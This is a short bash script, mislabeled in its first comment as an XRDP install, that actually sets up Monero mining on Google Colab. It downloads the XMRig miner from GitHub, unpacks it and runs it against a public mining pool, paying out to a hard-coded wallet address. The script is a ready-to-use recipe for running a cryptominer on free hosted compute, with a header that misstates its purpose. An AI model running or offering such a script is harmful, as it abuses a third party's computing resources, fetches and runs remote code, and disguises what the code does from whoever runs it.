#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o sg.minexmr.com:443 -u 44eSqvDL573Geq81EQM4mHiSkj3a2ehiR6w8FYJ3FnsAYVaQqED4LkKLYZGGLynjRhfNkUVn1wLS4bhQQ2MxZAku7MboStc -k --tls --rig-id GC
